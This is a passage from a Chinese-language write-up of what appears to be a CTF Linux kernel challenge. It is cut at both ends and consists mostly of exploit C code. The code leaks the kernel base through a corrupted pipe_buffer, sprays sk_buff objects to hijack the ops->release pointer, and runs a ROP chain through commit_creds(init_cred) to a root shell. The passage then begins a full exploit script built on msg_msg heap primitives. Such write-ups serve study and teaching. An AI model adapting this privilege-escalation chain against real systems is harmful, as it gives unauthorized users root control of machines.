class="token class-name">uint32_t</span>    padding<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    private<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>pipe_buf_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> SOCKET_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> SK_BUFF_NUM<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">,</span>                     <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to release sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>pipe_buf_ptr<span class="token operator">-></span>ops <span class="token operator">></span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n"</span><span class="token punctuation">,</span>                         pipe_buf_ptr<span class="token operator">-></span>ops<span class="token punctuation">)</span><span class="token punctuation">;</span>                kernel_offset <span class="token operator">=</span> pipe_buf_ptr<span class="token operator">-></span>ops <span class="token operator">-</span> ANON_PIPE_BUF_OPS<span class="token punctuation">;</span>                kernel_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span> <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n"</span><span class="token punctuation">,</span>             kernel_base<span class="token punctuation">,</span> kernel_offset<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="11"><li>有了内核基址后，构造<code>pipe_buffer-&gt;ops</code>，劫持<code>release</code>函数，完成控制流劫持，最后构造ROP栈迁移，返回用户态起shel。</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RSI_POP_RSP_POP_4VAL_RET</span> <span class="token expression"><span class="token number">0xffffffff812dbede</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff810938f0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INIT_CRED</span> <span class="token expression"><span class="token number">0xffffffff82c6d580</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">COMMIT_CREDS</span> <span class="token expression"><span class="token number">0xffffffff810d25c0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE</span> <span class="token expression"><span class="token number">0xffffffff81c00ff0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RSI_POP_RSP_POP_4VAL_RET</span> <span class="token expression"><span class="token number">0xffffffff812dbede</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FREE_PIPE_INFO</span> <span class="token expression"><span class="token number">0xffffffff81327570</span></span></span><span class="token comment">// 包含四个函数指针的结构体，照着源码搬运过来</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint64_t</span>    confirm<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    release<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    try_steal<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    get<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 用户态起shell</span><span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to gain the root!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>pipe_buf_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span> fake_secondary_msg<span class="token punctuation">;</span>    pipe_buf_ptr<span class="token operator">-></span>page <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"unr4v31."</span><span class="token punctuation">;</span>    pipe_buf_ptr<span class="token operator">-></span>ops <span class="token operator">=</span> victim_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">;</span>    ops_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    ops_ptr<span class="token operator">-></span>release <span class="token operator">=</span> PUSH_RSI_POP_RSP_POP_4VAL_RET <span class="token operator">+</span> kernel_offset<span class="token punctuation">;</span>    rop_idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    rop_chain <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>fake_secondary_msg<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> POP_RDI_RET<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> INIT_CRED<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> COMMIT_CREDS<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE <span class="token operator">+</span> <span class="token number">22</span><span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"unr4v31."</span><span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token string">"unr4v31."</span><span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> getRootShell<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_sp<span class="token punctuation">;</span>    rop_chain<span class="token punctuation">[</span>rop_idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] spray sk_buff to hijack pipe_buffer..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spraySkBuff</span><span class="token punctuation">(</span>sk_sockets<span class="token punctuation">,</span> fake_secondary_msg<span class="token punctuation">,</span>             <span class="token keyword">sizeof</span><span class="token punctuation">(</span>fake_secondary_msg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to spray sk_buff!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// for gdb attach only</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] gadget: %p\n"</span><span class="token punctuation">,</span> kernel_offset <span class="token operator">+</span> PUSH_RSI_POP_RSP_POP_4VAL_RET<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] free_pipe_info: %p\n"</span><span class="token punctuation">,</span> kernel_offset <span class="token operator">+</span> FREE_PIPE_INFO<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] trigger fake ops->release to hijack RIP..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> PIPE_NUM<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">close</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="完整利用脚本"><a href="#完整利用脚本" class="headerlink" title="完整利用脚本"></a>完整利用脚本</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;err.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;inttypes.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ipc.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/msg.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PRIMARY_MSG_SIZE</span> <span class="token expression"><span class="token number">96</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SECONDARY_MSG_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PRIMARY_MSG_TYPE</span>    <span class="token expression"><span class="token number">0x41</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SECONDARY_MSG_TYPE</span>  <span class="token expression"><span class="token number">0x42</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">VICTIM_MSG_TYPE</span>     <span class="token expression"><span class="token number">0x1337</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_TAG</span>     <span class="token expression"><span class="token number">0xAAAAAAAA</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SOCKET_NUM</span> <span class="token expression"><span class="token number">16</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SK_BUFF_NUM</span> <span class="token expression"><span class="token number">128</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PIPE_NUM</span> <span class="token expression"><span class="token number">256</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MSG_QUEUE_NUM</span> <span class="token expression"><span class="token number">4096</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OBJ_ADD</span>     <span class="token expression"><span class="token number">0x1234</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OBJ_EDIT</span>    <span class="token expression"><span class="token number">0x4321</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OBJ_SHOW</span> <span class="token expression"><span class="token number">0xbeef</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">OBJ_DEL</span>     <span class="token expression"><span class="token number">0xdead</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PREPARE_KERNEL_CRED</span> <span class="token expression"><span class="token number">0xffffffff810d2ac0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">INIT_CRED</span> <span class="token expression"><span class="token number">0xffffffff82c6d580</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">COMMIT_CREDS</span> <span class="token expression"><span class="token number">0xffffffff810d25c0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE</span> <span class="token expression"><span class="token number">0xffffffff81c00ff0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff810938f0</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ANON_PIPE_BUF_OPS</span> <span class="token expression"><span class="token number">0xffffffff8203fe40</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FREE_PIPE_INFO</span> <span class="token expression"><span class="token number">0xffffffff81327570</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_R14_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff81003364</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RSI_POP_RSP_POP_4VAL_RET</span> <span class="token expression"><span class="token number">0xffffffff812dbede</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CALL_RSI_PTR</span> <span class="token expression"><span class="token number">0xffffffff8105acec</span></span></span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_sp<span class="token punctuation">,</span> user_rflags<span class="token punctuation">;</span><span class="token class-name">size_t</span> kernel_offset<span class="token punctuation">,</span> kernel_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token punctuation">,</span> commit_creds<span class="token punctuation">,</span> swapgs_restore_regs_and_return_to_usermode<span class="token punctuation">,</span> init_cred<span class="token punctuation">;</span><span class="token keyword">long</span> dev_fd<span class="token punctuation">;</span><span class="token keyword">int</span> pipe_fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pipe_fd2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pipe_fd_1<span class="token punctuation">;</span><span class="token comment">/* * skb_shared_info 会携带320字节的头信息，所以大小是： * 1024 - 320 = 704 */</span><span class="token keyword">char</span> fake_secondary_msg<span class="token punctuation">[</span><span class="token number">704</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>dev_fd<span class="token punctuation">,</span> OBJ_ADD<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>dev_fd<span class="token punctuation">,</span> OBJ_DEL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_sp<span class="token punctuation">,</span> user_rflags<span class="token punctuation">;</span><span class="token comment">// 保存用户态寄存器，退出内核态时使用</span><span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">__asm__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs, cs;"</span>            <span class="token string">"mov user_ss, ss;"</span>            <span class="token string">"mov user_sp, rsp;"</span>            <span class="token string">"pushf;"</span>            <span class="token string">"pop user_rflags;"</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[34m\033[1m[*] Status has been saved.\033[0m\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 链表结构</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint64_t</span>    next<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    prev<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// msg_msg 信息头部结构体</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">list_head</span> m_list<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    m_type<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    m_ts<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    next<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    security<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// msg_msg 超出0x1000的部分不包含头部信息，而是一个next指针</span><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint64_t</span>    next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 主消息大小0x60</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>PRIMARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>primary_msg<span class="token punctuation">;</span><span class="token comment">// 副消息大小0x400</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span>SECONDARY_MSG_SIZE <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>secondary_msg<span class="token punctuation">;</span><span class="token comment">// 占用两页大小来读取存在的数据</span><span class="token keyword">struct</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>    <span class="token keyword">char</span> mtext<span class="token punctuation">[</span><span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x1000</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> oob_msg<span class="token punctuation">;</span><span class="token comment">// pipe_buffer 结构体照着源码搬运过来</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint64_t</span>    page<span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span>    offset<span class="token punctuation">,</span> len<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    ops<span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span>    flags<span class="token punctuation">;</span>    <span class="token class-name">uint32_t</span>    padding<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    private<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 包含四个函数指针的结构体，照着源码搬运过来</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span><span class="token punctuation">&#123;</span>    <span class="token class-name">uint64_t</span>    confirm<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    release<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    try_steal<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span>    get<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[31m\033[1m[x] Error: %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// msgrcv接收消息，从内核复制消息到用户，参数2是用户数据区，最后会调用free_msg释放消息</span><span class="token keyword">int</span> <span class="token function">readMsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> msqid<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msgtyp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// msgsnd发送消息，将用户数据发送到内核</span><span class="token keyword">int</span> <span class="token function">writeMsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> msqid<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>msgp <span class="token operator">=</span> msgtyp<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">msgsnd</span><span class="token punctuation">(</span>msqid<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// msgrcv接受消息，加上MSG_COPY标志的话，读取过的内核数据区不会被unlink</span><span class="token keyword">int</span> <span class="token function">peekMsg</span><span class="token punctuation">(</span><span class="token keyword">int</span> msqid<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>msgp<span class="token punctuation">,</span> <span class="token class-name">size_t</span> msgsz<span class="token punctuation">,</span> <span class="token keyword">long</span> msgtyp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid<span class="token punctuation">,</span> msgp<span class="token punctuation">,</span> msgsz <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">,</span> msgtyp<span class="token punctuation">,</span> MSG_COPY <span class="token operator">|</span> IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span><span 